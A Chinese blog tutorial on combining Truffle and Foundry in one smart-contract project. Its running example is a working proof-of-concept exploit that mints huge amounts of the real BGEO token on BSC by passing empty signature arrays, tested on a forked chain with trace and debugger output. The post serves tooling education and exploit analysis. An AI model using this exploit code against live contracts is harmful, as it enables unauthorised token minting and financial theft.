---
title: "在一个项目中同时使用Truffle和Foundry"
date: 2023-06-09T13:35:50+08:00
draft: false
author: yinhui
categories: [Blockchain]
tags: [L3,Web3.0] 
---

foundry套件有很棒的功能，比如一堆作弊码可以快速验证自己的想法，可以给地址打标签以及trace。truffle可以向GDB一样debug源代码的功能又太爽了，所有想把两者融合在同一个项目中。

<!--more-->

以编写[这个POC](https://yinhui1984.github.io/binance-bgeo-attack-analysis/)为例



## 创建项目

```shell
mkdir BGEO_DEMO
cd BGEO_DEMO
truffle init  --force
forge init --force   
```

关于项目文件夹， 由于 foundry套件中的命令很多都可以指定文件夹或文件路径，所以我们将`test`文件夹留给truffle, foundry的测试程序放到另外的文件夹中，比如`test_forge`  。 合约源代码都放到truffle创建的`contracts`文件夹中

## 编写合约

### 新建合约文件

如上所述， 合约源代码都放到truffle创建的`contracts`文件夹中。

```shell
truffle create contract POC
```

或手动创建

```shell
touch ./contracts/POC.sol
```



### 关于依赖的库

比如我们依赖 openzeppein, 为了同时让truffle 和forge都能编译通过，我们采用`forge install`的形式来安装依赖库，然后在源代码中直接使用相对路径

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

// 使用 forge install OpenZeppelin/openzeppelin-contracts --no-commit
// 然后使用相对路径
import "../lib/openzeppelin-contracts/contracts/access/Ownable.sol";

interface IBGEO20 {
    function balanceOf(address account) external view returns (uint256);

    function decimals() external view returns (uint8);

    function mint(
        uint256 _amount,
        string memory _txHash,
        address _receiver,
        bytes32[] memory _r,
        bytes32[] memory _s,
        uint8[] memory _v
    ) external returns (bool);
}
// this contract is on BSC chain
IBGEO20 constant BGEO = IBGEO20(0xc342774492b54ce5F8ac662113ED702Fc1b34972);

contract POC is Ownable {
    function randString() private view returns (string memory) {
        bytes32 rand = keccak256(
            abi.encodePacked(block.timestamp, block.difficulty)
        );
        return string(abi.encodePacked(rand));
    }

    function hack() public onlyOwner returns (uint256) {
        BGEO.mint(
            99999999999999999 * 10 ** 18,
            randString(), // use rand string, or else may revert by "tx-hash-used" in _mint() function
            address(this),
            new bytes32[](0),
            new bytes32[](0),
            new uint8[](0)
        );
        uint256 balance = BGEO.balanceOf(address(this));

        //require(balance == 0, "just for test");
        return balance;
    }
}

```

可以看到truffle 和 forge都编译通过了

```sh
~/Dow/BGEO_DEMO main +2 !5 6 ❯ forge build              
[⠢] Compiling...
[⠒] Compiling 13 files with 0.8.17
[⠰] Solc 0.8.17 finished in 2.90s
Compiler run successful!

~/Dow/BGEO_DEMO main +2 !5 6 ❯ truffle compile      
Compiling your contracts...
===========================
> Compiling ./contracts/POC.sol
> Compiling ./lib/openzeppelin-contracts/contracts/access/Ownable.sol
> Compiling ./lib/openzeppelin-contracts/contracts/utils/Context.sol
> Artifacts written to /Users/zhouyinhui/Downloads/BGEO_DEMO/build/contracts
> Compiled successfully using:
   - solc: 0.8.10+commit.fc410830.Emscripten.clang
```



## 部署合约

### 关于节点

需要考虑测试节点能同时满足truffle和forge, 经过尝试，最好的办法是使用ganache (CLI版本)分叉主网。

注：不要使用foundry 自带的anvil, 其在truffle测试时不能提供源代码信息

```
ganache --fork.url https://rpc.ankr.com/bsc/<YOUR_API_KEY> --fork.blockNumber 22315679
```

### 连接到节点

truffle: 在truffle-config.js的networks中配置

```
    development: {
      host: "127.0.0.1",     // Localhost (default: none)
      port: 8545,            // Standard Ethereum port (default: none)
      network_id: "*",       // Any network (default: none)
    },
```

foundry： 在foundry.toml中配置

```
eth-rpc-url = "http://localhost:8545"
```



## 部署

只使用truffle进行部署就可以了，因为truffle和foundry共用一个节点

创建部署文件：

```
truffle create migration POC
```

部署代码：
```
var POC = artifacts.require("POC");

module.exports = function (_deployer) {
  // Use deployer to state migration tasks.
  _deployer.deploy(POC);
};

```

部署：

```
truffle migrate --reset
```

输出：

```
~/Dow/BGEO_DEMO main +2 !5 6 ❯ make deploy                anaconda3  18.12.1 ⮂ 127.0.0.1:7890
truffle migrate --reset 

Compiling your contracts...
===========================
> Everything is up to date, there is nothing to compile.


Starting migrations...
======================
> Network name:    'development'
> Network id:      56
> Block gas limit: 30000000 (0x1c9c380)


1686278999_p_o_c.js
===================

   Replacing 'POC'
   ---------------
   > transaction hash:    0x414c623dde6551e2bf8c0ffa8f2d8f040137bedfac97585f9e4a6d9b73238e1c
   > Blocks: 0            Seconds: 0
   > contract address:    0xEc805CA1AF9C55965EfFcDCd69cb3C2429663A99
   > block number:        22315699
   > block timestamp:     1686292948
   > account:             0x712517A5895fCD531E77A98F67b4517ED86BaA4a
   > balance:             999.975114113706586465
   > gas used:            730768 (0xb2690)
   > gas price:           2.585480836 gwei
   > value sent:          0 ETH
   > total cost:          0.001889386659562048 ETH

   > Saving artifacts
   -------------------------------------
   > Total cost:     0.001889386659562048 ETH

Summary
=======
> Total deployments:   1
> Final cost:          0.001889386659562048 ETH
```



## 测试

### forge test

forge的测试程序需要新建一个文件夹，而不是将其放在默认的test文件夹中，否则truffle会把forge的测试程序认为是自己的 

```
mkdir test_forge
touch test_forge/poc.t.sol
```

```
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.10;

import "../lib/forge-std/src/Test.sol";
import "../contracts/POC.sol";

contract TestPoC is Test {
    POC poc;

    function setUp() public {
        poc = new POC();
        vm.label(address(poc), "POC");
        vm.label(address(this), "this");
        vm.label(address(BGEO), "BEGO");
    }

    function testHack() public {
        uint256 balance = poc.hack();
        emit log_named_decimal_uint("balance i have", balance, 18);
        assertGt(balance, 0);
    }
}
```

运行测试：

注： 在forge test 中可以用 -C指定测试程序路径

```
forge test -C "test_forge/" -vvvv
[⠰] Compiling...
[⠃] Compiling 1 files with 0.8.17
[⠊] Solc 0.8.17 finished in 1.46s
Compiler run successful!

Running 1 test for test_forge/poc.t.sol:TestPoC
[PASS] testHack() (gas: 69937)
Logs:
  balance i have: 99999999999999999.000000000000000000

Traces:
  [69937] this::testHack() 
    ├─ [62491] POC::hack() 
    │   ├─ [55211] BEGO::mint(99999999999999999000000000000000000 [9.999e34], f����+����{)p��q�ub$!m(`�., POC: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], [], [], []) 
    │   │   ├─ emit Transfer(param0: 0x0000000000000000000000000000000000000000, param1: POC: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param2: 99999999999999999000000000000000000 [9.999e34])
    │   │   └─ ← 0x0000000000000000000000000000000000000000000000000000000000000001
    │   ├─ [519] BEGO::balanceOf(POC: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← 0x000000000000000000000000000000000013426172c74d821da6d934589c0000
    │   └─ ← 99999999999999999000000000000000000 [9.999e34]
    ├─ emit log_named_decimal_uint(key: balance i have, val: 99999999999999999000000000000000000 [9.999e34], decimals: 18)
    └─ ← ()

Test result: ok. 1 passed; 0 failed; finished in 24.17ms
```



### truffle test

在test文件夹中创建truffle测试文件

```
truffle create test POC
```

```js
const POC = artifacts.require("POC");


contract("POC", function (accounts) {
  console.log("Running test cases...");

  it("hack test", async function () {
    let instance = await POC.deployed();
    let tx = await instance.hack();
    console.log(tx)
    assert(tx !== null, "Transaction should not be null");

  });

});
```

运行测试：

```
truffle test
```



```
请确保合约已经部署，这和forge不一样

truffle test
Using network 'development'.


Compiling your contracts...
===========================
> Everything is up to date, there is nothing to compile.
Running test cases...


  Contract: POC
{
  tx: '0xd15318c7770ee6cbe4a7c4943b2581987e37e6bc8cd27189fb079742c2de2509',
  receipt: {
    transactionHash: '0xd15318c7770ee6cbe4a7c4943b2581987e37e6bc8cd27189fb079742c2de2509',
    transactionIndex: 0,
    blockNumber: 22315730,
    blockHash: '0xf4fe2a264157abce7b43f2a98ea5bdc02190526c88caeee6f6ad2299057ed107',
    from: '0x712517a5895fcd531e77a98f67b4517ed86baa4a',
    to: '0x4f471b5ce39210b343800c94e8fcdcb97bee1db4',
    cumulativeGasUsed: 85959,
    gasUsed: 85959,
    contractAddress: null,
    logs: [],
    logsBloom: '0x00000000000000000000001000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000020000000000000000000800000080000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000020000000000000000002000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000001000000000000080000000',
    status: true,
    effectiveGasPrice: 2501568968,
    type: '0x2',
    rawLogs: [ [Object] ]
  },
  logs: []
}
    ✔ hack test (3469ms)


  1 passing (4s)
```



## 调试

相比于forge test 中的用log进行打印来调试， truffle的debug功能就太强大了

### 调试tx

```
truffle debug 0xd15318c7770ee6cbe4a7c4943b2581987e37e6bc8cd27189fb079742c2de2509  -x
```

注意最后的 `-x`选项 ，由于我们的代码引用了在bsc链上已经verfied的合约 `IBGEO20 constant BGEO = IBGEO20(0xc342774492b54ce5F8ac662113ED702Fc1b34972) `  那么  `-x`选项 会去下载 改合约的代码以便调试了可以step into其代码

```
debug(development:0xd15318c7...)> l

BGeoToken.sol:

1241:     function checkSignParams(
1242:         bytes32[] memory _r,
1243:         bytes32[] memory _s,
1244:         uint8[] memory _v
1245:     ) private view returns (bool){
1246:         return (_r.length == _s.length) && (_s.length == _v.length);
                      ^^^^^^^^^
1247:     }
1248:
1249:

debug(development:0xd15318c7...)> v

Solidity built-ins:
    msg: {
           data: hex'32a09b10000000000000000000000000000000000013426172c74d821da6d934589c000000000000000000000000000000000000000000000000000000000000000000c00000000000000000000000004f471b5ce39210b343800c94e8fcdcb97bee1db40000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000012000000000000000000000000000000000000000000000000000000000000001400000000000000000000000000000000000000000000000000000000000000020a662d2138624b3cefaa2ca8e4846882068dbbaa7dcd89541471754d2c50bb657000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000',
           sig: 0x32a09b10,
           sender: 0x4f471B5CE39210b343800c94e8fCDcB97bEe1DB4,
           value: 0
         }
     tx: {
           origin: 0x712517A5895fCD531E77A98F67b4517ED86BaA4a,
           gasprice: 2501568968
         }
  block: {
           coinbase: 0x0000000000000000000000000000000000000000,
           difficulty: 6137103538401385071974411046224224370499740472585752841626323261317793736621,
           gaslimit: 30000000,
           number: 22315730,
           timestamp: 1686295389
         }
   this: 0xc342774492b54ce5F8ac662113ED702Fc1b34972 (BGeoToken)
    now: 1686295389

Contract variables:
   signers: {
              _inner: {
                _values: ?,
                _indexes: Map(0) {}
              }
            }
       bsc: 0
  txHashes: Map(0) {}

Local variables:
  _r: []
  _s: []
  _v: []

Note: Some storage variables could not be fully decoded; the debugger can only see storage it has seen touched during the transaction.
debug(development:0xd15318c7...)>
```



### 在test case中加入调试

在需要调试的语句上加上`debug()` 包装， 并且在truffle test 中加入`--debug`选项，就可以在改语句上执行调试

```js
const POC = artifacts.require("POC");


contract("POC", function (accounts) {
  console.log("Running test cases...");

  it("hack test", async function () {
    let instance = await POC.deployed();
    let tx = await debug(instance.hack()); // here, add debug(xxxx)
    console.log(tx)
    assert(tx !== null, "Transaction should not be null");

  });
});
```

```
truffle test --debug
```

注：truffle test --debug 没有  `-x`选项



### 调试合约的只读方法

 https://trufflesuite.com/docs/truffle/how-to/debug-test/use-the-truffle-debugger/#debugging-read-only-calls

